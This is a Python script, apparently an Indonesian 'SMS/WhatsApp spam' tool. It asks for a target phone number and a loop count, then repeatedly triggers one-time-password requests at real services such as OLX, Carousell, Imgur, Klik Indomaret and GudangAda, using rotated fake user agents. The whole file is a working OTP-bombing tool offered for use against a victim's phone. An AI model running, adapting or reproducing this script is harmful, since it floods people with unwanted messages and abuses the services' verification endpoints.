#Script oleh https://github.com/XniceCraft

import sys
try:
    import os,requests as re,platform
    from time import sleep
    from random import choice
except ModuleNotFoundError:
    print("[Err] Module Tidak Ditemukan. Harap menjalankan perintah 'pip3 install -r r.txt'")
    sys.exit()

#VAR
so=sys.stdout
class ua:
    def d():
        return choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59","Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0","Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"])
    def m():
        return choice(["Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTA Build/NS6264) CTV","Dalvik/2.1.0 (Linux; U; Android 9; SM-G950U Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930V Build/R16NW)"])

#COLOR CODE
if platform.system() == 'Windows':
    try:
        from colorama import init, Fore as F, Style as S
        init()
        R=F.RED + S.BRIGHT
        G=F.GREEN + S.BRIGHT
        Y=F.YELLOW + S.BRIGHT
        C=F.CYAN + S.BRIGHT
        M=F.MAGENTA + S.BRIGHT
        W=F.WHITE + S.BRIGHT
        D=F.RESET
        clear="cls"
    except ModuleNotFoundError:
        print("[Err] Instal colorama dengan 'pip install colorama'")
        sys.exit()

else:
    R="\033[1;31m"
    G="\033[1;32m"
    Y="\033[1;33m"
    M="\033[1;35m"
    C="\033[1;36m"
    W="\033[1;37m"
    D="\033[1;0m"
    clear="clear"

#FUNCTION
def fWriter(isi):
    for x in isi + '\n':
        so.write(x)
        so.flush()
        sleep(0.005)

def banner():
    so.write(W)
    fWriter(f'''
   _____                       
  / ____|                      
 | (___  _ __   __ _ _ __ ___  
  \___ \| '_ \ / _` | '_ ` _ \ 
  ____) | |_) | (_| | | | | | |
 |_____/| .__/ \__,_|_| |_| |_|
        | |                    
        |_|                    
''')
    so.write(C)
    fWriter('[+] Tools By https://github.com/XniceCraft [+]')

#SPAM SMS
class sms:
    def __init__(self, no):
        self.no=no

    def ulang(self):
        print(f"{C}=============={W}")
        self.loop=int(input("Loop : "))
        print(f"{W}==============")

    def end(self):
        print(f"{W}Press Enter to Continue...")
        input()
        self.menu()

    def olx(self):
        for i in range(self.loop):
            r=re.post("https://www.olx.co.id/api/auth/authenticate",headers={"content-type":"application/json","user-agent":ua.d()},data="{\"grantType\":\"phone\",\"phone\":\"+62%s\",\"language\":\"id\"}" % self.no).text
            if "PENDING" in r:
                print(f"{G}<√> Sukses - OLX [SMS]")
            else:
                print(f"{R}<X> Gagal - OLX [SMS]")

    def carousell(self):
        if self.loop == 1:
            pass
        else:
            print(f"{Y}Cooldown : 30s")
        for i in range(self.loop):
            r=re.post("https://id.carousell.com/service/auth/verification-code",headers={"content-type":"application/json","user-agent":ua.d()},data="{\"countryCode\":\"ID\",\"mobile\":\"%s\"}" % self.no).text
            if "requestId" in r:
                print(f"{G}<√> Sukses - Carousell [SMS]")
            else:
                print(f"{R}<X> Gagal - Carousell [SMS]")
            if i+1 == self.loop:
                pass
            else:
                sleep(30)

    def imgur(self):
        for i in range(self.loop):
            r=re.post("https://api.imgur.com/account/v1/phones/verify",headers={"content-type":"application/json","user-agent":ua.d()},data="{\"phone_number\":\"0%s\",\"region_code\":\"ID\"}" % self.no).text
            if '{"errors":[{"id":"","code":"429","status":"Too Many Requests","detail":"Too Many Requests"}]}"' in r:
                print(f"{R}<X> Gagal - Imgur [SMS]")
            else:
                print(f"{G}<√> Sukses - Imgur [SMS]")

    def chataja(self):
        if self.loop == 1:
            pass
        else:
            print(f"{Y}Cooldown : 30s")
        for i in range(self.loop):
            r=re.post("https://api.chataja.co.id/api/v3/auth_nonce",headers={"content-type":"application/json","user-agent":ua.m()},data="{\"user\":{\"app_id\":\"kiwari-prod\",\"phone_number\":\"+62%s\"}}" % self.no).text
            if 'Passcode sent. Please verify your account.' in r:
                print(f"{G}<√> Sukses - Chataja [SMS]")
            else:
                print(f"{R}<X> Gagal - Chataja [SMS]")
            if i+1 == self.loop:
                pass
            else:
                sleep(30)

    def indomaret(self):
        if self.loop == 1:
            pass
        else:
            print(f"{Y}Cooldown : 30s")
        for i in range(self.loop):
            r=re.get("https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=0%s&token=" % self.no,headers={"content-type":"application/json","user-agent":ua.m()}).text
            if "Kode OTP berhasil dikirim ke nomor telepon Anda." in r:
                print(f"{G}<√> Sukses - Klik Indomaret [SMS]")
            else:
                print(f"{R}<X> Gagal - Klik Indomaret [SMS]")
            if i+1 == self.loop:
                pass
            else:
                sleep(30)

    def kpintar(self):
        for i in range(self.loop):
            r=re.post("https://app.atome.id/api/auth/send-code?lang=id",headers={"content-type":"application/json; charset=UTF-8","user-agent":ua.d()},data="{\"mobileNumber\":\"0%s\",\"type\":\"SMS\"}" % self.no)
            if r.status_code == 204:
                print(f"{G}<√> Sukses - Kredit Pintar [SMS]")
            else:
                print(f"{R}<X> Gagal - Kredit Pintar [SMS]")

    def all(self, c, l=0):
        if c:
            l=self.loop
            self.loop=1
            for i in range(l):
                self.olx()
                self.carousell()
                self.imgur()
                self.chataja()
                self.indomaret()
                self.kpintar()
        else:
            self.loop=1
            for i in range(l):
                self.olx()
                self.carousell()
                self.imgur()
                self.chataja()
                self.indomaret()
                self.kpintar()

    def menu(self):
        os.system(clear)
        print(f'''
{W}Target : {G}0{self.no}
{C}=====================
{W}<{Y}1{W}> SPAM OLX
<{Y}2{W}> SPAM Carousell
<{Y}3{W}> SPAM Imgur
<{Y}4{W}> SPAM Chataja
<{Y}5{W}> SPAM Klik Indomaret
<{Y}6{W}> SPAM Kredit Pintar
<{Y}7{W}> All
<{Y}8{W}> {M}Back{D}''')
        sel=input("<Select> : ")

        if sel == "1" or sel == "01":
            self.ulang()
            self.olx()
            self.end()

        elif sel == "2" or sel == "02":
            self.ulang()
            self.carousell()
            self.end()

        elif sel == "3" or sel == "03":
            self.ulang()
            self.imgur()
            self.end()

        elif sel == "4" or sel == "04":
            self.ulang()
            self.chataja()
            self.end()

        elif sel == "5" or sel == "05":
            self.ulang()
            self.indomaret()
            self.end()

        elif sel == "6" or sel == "06":
            self.ulang()
            self.kpintar()
            self.end()

        elif sel == "7" or sel == "07":
            self.ulang()
            self.all(True)
            self.end()

        elif sel == "8" or sel == "08":
            Main()

#SPAM WA
class wa:
    def __init__(self, no):
        self.no=no

    def ulang(self):
        print(f"{C}=============={W}")
        self.loop=int(input("Loop : "))
        print(f"==============")

    def end(self):
        print(f"{W}Press Enter to Continue...")
        input()
        self.menu()

    def gudangada(self):
        for i in range(self.loop):
            r=re.post("https://marketplace-api.gudangada.com/api/auth/otp/generate",headers={"content-type":"application/json; charset=UTF-8","user-agent":ua.m(),"Host":"marketplace-api.gudangada.com"},data="{\"otp_type\":\"WHATSAPP\",\"phone_number\":\"62%s\",\"verification_type\":\"GADA_MARKETPLACE_%s\"}" % (self.no,choice(["LOGIN","REGISTER"]))).text
            if "\"success\":true" in r:
                print(f"{G}<√> Sukses - GudangAda [WA]")
            else:
                print(f"{R}<X> Gagal - GudangAda [WA]")

    def all(self, c, l=0):
        if c:
            l=self.loop
            self.loop=1
            for i in range(l):
                self.gudangada()
        else:
            self.loop=1
            for i in range(l):
                self.gudangada()

    def menu(self):
        os.system("clear")
        print(f'''
{W}Target : 0{self.no}
{C}=====================
{W}<{Y}1{W}> GudangAda
<{Y}2{W}> All
<{Y}3{W}> {M}Back{D}''')
        sel=input("<Select> : ")

        if sel == "1" or sel == "1":
            self.ulang()
            self.gudangada()
            self.end()

        elif sel == "2" or sel == "02":
           self.ulang()
           self.all(True)
           self.end()

        elif sel == "3" or sel == "03":
            Main()

class all:
    def __init__(self, no):
        self.no=no
        self.run()

    def run(self):
        print(f"{W}==============")
        l=int(input("Loop : "))
        print(f"{W}==============")
        sms.all(sms(self.no), False,  l=l)
        wa.all(wa(self.no), False, l=l)
        print(f"{W}Press Enter to Continue...")
        input()
        Main()

class Main:
    def __init__(self):
        self.menu()

    def input_hp(self, a, b):
        os.system(clear)
        banner()
        print(f'''
{G}Dipilih : {b}
{W}======================
{C}Example : 082333333333{Y}''')
        hp=input("[?] No. HP : ")
        if hp.startswith("+62") and 12 <= len(hp) <= 16:
            hp=hp[3:]
        elif hp.startswith("0") and 10 <= len(hp) <= 14:
            hp=hp[1:]
        else:
            print(f"{R}[Err] No. HP tidak valid")
            sys.exit()

        if a == "1":
            sms(hp).menu()
        elif a == "3":
            wa(hp).menu()
        elif a == "4":
            all(hp)

    def menu(self):
        os.system(clear)
        banner()
        print(f'''
{W}================
<{Y}1{W}>. Spam Sms
{W}<{Y}2{W}>. Spam Telepon (Tidak Aktif)
{W}<{Y}3{W}>. Spam Whatsapp
{W}<{Y}4{W}>. All
{W}<{Y}5{W}>. {R}Quit''')
        so.write(G)
        sel=input("<Select> : ")

        if sel == "1" or sel == "01":
            self.input_hp("1","Spam SMS")
        elif sel == "2" or sel == "02":
            print("[!] Untuk sekarang opsi ini tidak tersedia")
            sys.exit()
        elif sel == "3" or sel == "03":
            self.input_hp("3","Spam Whatsapp")
        elif sel == "4" or sel == "04":
            self.input_hp("4","Spam All")
        elif sel == "5" or sel == "05":
            print(f"{R}[X] {W}Quit Selected{D}")
            sys.exit()
        else:
            print(f"{R}[Err] Opsi tidak ada")
            sys.exit()

if __name__ == "__main__":
    try:
        Main()
    except KeyboardInterrupt:
        print(f"\r\n{R}Exit!{D}")
        sys.exit()
